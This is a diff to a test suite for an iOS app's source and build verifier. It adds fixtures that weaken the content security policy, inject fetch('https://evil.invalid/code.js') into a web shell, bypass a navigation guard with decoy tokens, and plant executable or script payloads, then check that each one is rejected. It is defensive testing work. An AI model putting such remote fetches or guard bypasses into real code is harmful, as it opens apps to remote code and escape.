@@ -53,6 +53,11 @@ test("repository contains and passes the complete iPhone source boundary", () =>
     assert.equal(existsSync(join(ROOT, path)), true, `missing ${path}`);
   }
   assert.deepEqual(verifySource(ROOT).deviceFamily, [1]);
+  const packageJson = JSON.parse(readFileSync(join(ROOT, "package.json"), "utf8")) as { scripts: Record<string, string> };
+  assert.match(packageJson.scripts["ios:test"] ?? "", /run-ios-test\.mjs/u);
+  const gate = readFileSync(join(ROOT, "scripts/ios/run-ios-test.mjs"), "utf8");
+  assert.match(gate, /process\.platform !== "darwin"/u);
+  assert.match(gate, /run-simulator-offline\.mjs/u);
 });
 
 test("remote entry URLs and generated navigation allowances fail closed", (context) => {
@@ -100,21 +105,44 @@ test("Node, Python, disguised executables, and undeclared frameworks fail closed
 test("CSP weakening and remote shell assets fail closed", (context) => {
   const root = fixture(context);
   rewrite(root, "ios-web/index.html", (source) => source.replace("connect-src 'none'", "connect-src https://evil.invalid"));
-  rejects(root, /CSP connect-src|weakening/u);
+  rejects(root, /reviewed bytes|CSP connect-src|weakening/u);
 
   cpSync(join(ROOT, "ios-web/index.html"), join(root, "ios-web/index.html"));
   rewrite(root, "ios-web/shell.js", (source) => `${source}\nfetch("https://evil.invalid/code.js");\n`);
-  rejects(root, /remote URL/u);
+  rejects(root, /reviewed bytes|remote URL/u);
+
+  cpSync(join(ROOT, "ios-web/index.html"), join(root, "ios-web/index.html"));
+  cpSync(join(ROOT, "ios-web/shell.js"), join(root, "ios-web/shell.js"));
+  rewrite(root, "ios-web/index.html", (source) => source.replace(
+    /(<meta\s+http-equiv="Content-Security-Policy"[\s\S]*?>)/u,
+    "<!-- $1 -->",
+  ));
+  rejects(root, /reviewed bytes|CSP/u);
+
+  cpSync(join(ROOT, "ios-web/index.html"), join(root, "ios-web/index.html"));
+  rewrite(root, "ios-web/index.html", (source) => source.replace("</head>", '<meta http-equiv="Content-Security-Policy" content="default-src \'none\'">\n</head>'));
+  rejects(root, /reviewed bytes|CSP/u);
+
+  cpSync(join(ROOT, "ios-web/index.html"), join(root, "ios-web/index.html"));
+  rewrite(root, "ios-web/index.html", (source) => source.replace("content=\"default-src", "content=default-src"));
+  rejects(root, /reviewed bytes|CSP/u);
 });
 
 test("navigation delegate weakening and window escape fail closed", (context) => {
   const root = fixture(context);
   rewrite(root, "ios/App/App/ContainedBridgeViewController.swift", (source) => source.replace("candidate.scheme == localOrigin.scheme", "candidate.scheme == \"https\""));
-  rejects(root, /native containment is missing/u);
+  rejects(root, /reviewed bytes|native containment is missing/u);
 
   cpSync(join(ROOT, "ios/App/App/ContainedBridgeViewController.swift"), join(root, "ios/App/App/ContainedBridgeViewController.swift"));
   rewrite(root, "ios/App/App/ContainedBridgeViewController.swift", (source) => `${source}\n// UIApplication.shared.open is forbidden even in future handoff code\n`);
-  rejects(root, /external-navigation/u);
+  rejects(root, /reviewed bytes|external-navigation/u);
+
+  cpSync(join(ROOT, "ios/App/App/ContainedBridgeViewController.swift"), join(root, "ios/App/App/ContainedBridgeViewController.swift"));
+  rewrite(root, "ios/App/App/ContainedBridgeViewController.swift", (source) => source.replace(
+    "guard isBundledNavigation(navigationAction) else {",
+    "if false && !isBundledNavigation(navigationAction) {",
+  ) + "\n// verifier-tokens-only: action.targetFrame != nil candidate.scheme == localOrigin.scheme candidate.host == localOrigin.host candidate.port == localOrigin.port decisionHandler(.cancel) createWebViewWith return nil capacitorDelegate.webView\n");
+  rejects(root, /reviewed bytes|native containment/u);
 });
 
 test("wrong bundle identifier, minimum OS, and device family fail closed", (context) => {
@@ -155,6 +183,32 @@ test("privacy claims, deploy re-enablement, and extra plugin bundles fail closed
   cpSync(join(ROOT, "ios/App/App/config.xml"), join(root, "ios/App/App/config.xml"));
   mkdirSync(join(root, "ios/App/App/Plugins/Evil.bundle"), { recursive: true });
   rejects(root, /undeclared native bundle/u);
+
+  rmSync(join(root, "ios/App/App/Plugins"), { recursive: true, force: true });
+  rewrite(root, "ios/App/App/PrivacyInfo.xcprivacy", (source) => source.replace("</plist>", "<broken></plist>"));
+  rejects(root, /privacy manifest/u);
+
+  cpSync(join(ROOT, "ios/App/App/PrivacyInfo.xcprivacy"), join(root, "ios/App/App/PrivacyInfo.xcprivacy"));
+  writeFileSync(join(root, "ios/App/App/Evil.swift"), "import Foundation\n");
+  rejects(root, /Swift source inventory/u);
+});
+
+test("built verifier rejects arbitrary executable and script payloads", { skip: process.platform !== "darwin" }, (context) => {
+  const sourceApp = join(ROOT, ".build/ios/Build/Products/Debug-iphonesimulator/App.app");
+  if (!existsSync(sourceApp)) {
+    context.skip("Darwin built-app mutations run after ios:build in the declared ios:test gate");
+    return;
+  }
+  const app = join(mkdtempSync(join(tmpdir(), "greenroom-built-app-")), "App.app");
+  context.after(() => rmSync(dirname(app), { recursive: true, force: true }));
+  cpSync(sourceApp, app, { recursive: true });
+  const payload = join(app, "innocent.dat");
+  writeFileSync(payload, "harmless bytes\n");
+  chmodSync(payload, 0o755);
+  assert.throws(() => verifyBuiltApp(app), /unexpected executable mode/u);
+  chmodSync(payload, 0o644);
+  writeFileSync(payload, "#!/usr/bin/env python3\nprint('hello')\n");
+  assert.throws(() => verifyBuiltApp(app), /script payload/u);
 });
 
 test("built verifier gates trusted Apple plist parsing to Darwin", { skip: process.platform === "darwin" }, () => {
